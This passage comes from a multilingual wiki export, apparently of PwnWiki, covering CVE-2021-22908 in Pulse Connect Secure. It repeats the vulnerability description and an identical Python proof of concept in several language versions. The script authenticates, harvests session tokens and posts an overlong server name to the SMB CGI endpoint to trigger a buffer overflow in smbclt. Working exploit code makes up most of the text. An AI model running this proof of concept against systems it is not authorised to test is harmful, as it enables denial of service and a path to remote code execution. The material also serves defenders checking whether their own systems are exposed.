    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

== المرجع ==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>krldbsvaiyjjy2l5ltf2kq08d65t9rs</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>3411</id>
    <revision>
      <id>3976</id>
      <timestamp>2021-06-04T02:01:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Reference=="</comment>
      <origin>3976</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11906" sha1="o4crtvya39657l9zmv8uzzg35nu2pj9" xml:space="preserve">&lt;languages  /&gt;
==Vulnerability description==

Because PCS supports connecting to Windows file sharing (SMB), the function is provided by CGI scripts based on Samba 4.5.10 libraries and auxiliary applications. When specifying a long server name for certain SMB operations, the smbclt application may crash due to buffer overflow, depending on the length of the specified server name.

It has been confirmed that this vulnerability exists in the PCS 9.1R11.4 system. The target CGI endpoint is &lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;. Other CGI endpoints may also trigger this vulnerability.

If an attacker fails to clean up after successfully exploiting this vulnerability, specifying a long server name may result in the following PCS event log entries:
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

But to exploit this vulnerability, the PCS server must have a Windows file access policy that allows \\* or another policy that allows an attacker to connect to any server. You can view the current SMB policy by viewing User-&gt;Resource Policy-&gt;Windows File Access Policy on the PCS management page. 9.1R2 and earlier PCS devices use the default policy of allowing connections to any SMB host. Starting from 9.1R3, this policy has been changed from the default permission to the default denial.

==Scope of influence==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

==Reference==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>o4crtvya39657l9zmv8uzzg35nu2pj9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/es</title>
    <ns>0</ns>
    <id>3410</id>
    <revision>
      <id>3975</id>
      <timestamp>2021-06-04T01:59:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Alcance de influencia =="</comment>
      <origin>3975</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12146" sha1="qyfo5c3xkxu8ypzlcsiyhyvjvprbq5i" xml:space="preserve">&lt;languages  /&gt;
== Descripción de la vulnerabilidad ==

Debido a que PCS admite la conexión al uso compartido de archivos de Windows (SMB), la función la proporcionan los scripts CGI basados ​​en las bibliotecas y aplicaciones auxiliares de Samba 4.5.10. Al especificar un nombre de servidor largo para ciertas operaciones SMB, la aplicación smbclt puede fallar debido al desbordamiento del búfer, dependiendo de la longitud del nombre de servidor especificado.

Se ha confirmado que el sistema PCS 9.1R11.4 tiene esta vulnerabilidad. El punto final CGI de destino es &lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;. Otros puntos finales CGI también pueden desencadenar esta vulnerabilidad.

Si un atacante no puede limpiar después de aprovechar con éxito esta vulnerabilidad, especificar un nombre de servidor largo puede resultar en las siguientes entradas de registro de eventos de PCS:
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

Pero para aprovechar esta vulnerabilidad, el servidor PCS debe tener una política de acceso a archivos de Windows que permita \\ * u otra política que permita a un atacante conectarse a cualquier servidor. Puede ver la política SMB actual en Usuario-&gt; Política de recursos-&gt; Política de acceso a archivos de Windows en la página de administración de PCS. 9.1R2 y los dispositivos PCS anteriores utilizan la política predeterminada de permitir conexiones a cualquier host SMB. A partir de 9.1R3, esta política se ha cambiado del permiso predeterminado al rechazo predeterminado.

== Alcance de influencia ==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

== Referencia ==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>qyfo5c3xkxu8ypzlcsiyhyvjvprbq5i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/fa</title>
    <ns>0</ns>
    <id>3447</id>
    <revision>
      <id>4013</id>
      <timestamp>2021-06-04T02:16:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22908 Pulse Connect آسیب پذیری اجرای کد دلخواه امن"</comment>
      <origin>4013</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12553" sha1="h4apj1rm93v4wqs3k7a2goe44exxbeh" xml:space="preserve">&lt;languages  /&gt;
== شرح آسیب پذیری ==

از آنجا که PCS از اتصال به اشتراک فایل Windows (SMB) پشتیبانی می کند ، عملکرد توسط اسکریپت های CGI مبتنی بر کتابخانه ها و برنامه های کمکی Samba 4.5.10 ارائه می شود. هنگام تعیین نام سرور طولانی برای برخی از عملیات SMB ، ممکن است برنامه smbclt به دلیل سرریز شدن بافر خراب شود ، این بستگی به طول نام سرور مشخص شده دارد.

تأیید شده است که سیستم PCS 9.1R11.4 از این آسیب پذیری برخوردار است. نقطه پایانی CGI &lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt; است. سایر نقاط انتهایی CGI نیز ممکن است این آسیب پذیری را تحریک کنند.

اگر یک مهاجم پس از سو successfully استفاده از این آسیب پذیری نتواند پاکسازی کند ، تعیین یک نام سرور طولانی ممکن است منجر به ورودی های رویداد PCS زیر شود:
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

اما برای سو explo استفاده از این آسیب پذیری ، سرور PCS باید خط مشی دسترسی فایل Windows داشته باشد که اجازه می دهد \\ * یا خط مشی دیگری که به مهاجم اجازه می دهد به هر سرور متصل شود. با مشاهده User-&gt; Resource Policy-&gt; Windows File Policy Policy در صفحه مدیریت PCS می توانید سیاست SMB فعلی را مشاهده کنید. 9.1R2 و دستگاه های PCS قبلی از سیاست پیش فرض اجازه اتصال به هر میزبان SMB استفاده می کنند. با شروع از 9.1R3 ، این سیاست از مجوز پیش فرض به رد پیش فرض تغییر کرده است.

== دامنه تأثیر ==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
